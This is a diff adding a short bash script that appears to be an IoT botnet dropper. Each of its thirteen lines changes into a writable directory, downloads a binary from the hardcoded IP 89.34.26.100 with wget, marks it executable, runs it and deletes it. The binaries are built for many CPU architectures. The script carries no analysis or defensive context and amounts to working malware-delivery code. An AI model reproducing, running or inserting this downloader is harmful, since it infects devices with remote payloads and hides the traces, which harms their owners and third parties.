@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9mips; chmod +x cc9mips; ./cc9mips; rm -rf cc9mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9mpsl; chmod +x cc9mpsl; ./cc9mpsl; rm -rf cc9mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9sh4; chmod +x cc9sh4; ./cc9sh4; rm -rf cc9sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9x86; chmod +x cc9x86; ./cc9x86; rm -rf cc9x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9arm6; chmod +x cc9arm6; ./cc9arm6; rm -rf cc9arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9i686; chmod +x cc9i686; ./cc9i686; rm -rf cc9i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9ppc; chmod +x cc9ppc; ./cc9ppc; rm -rf cc9ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9i586; chmod +x cc9i586; ./cc9i586; rm -rf cc9i586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9m68k; chmod +x cc9m68k; ./cc9m68k; rm -rf cc9m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9adc; chmod +x cc9adc; ./cc9adc; rm -rf cc9adc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9dss; chmod +x cc9dss; ./cc9dss; rm -rf cc9dss
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9cco; chmod +x cc9cco; ./cc9cco; rm -rf cc9cco
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.34.26.100/cc9scar; chmod +x cc9scar; ./cc9scar; rm -rf cc9scar
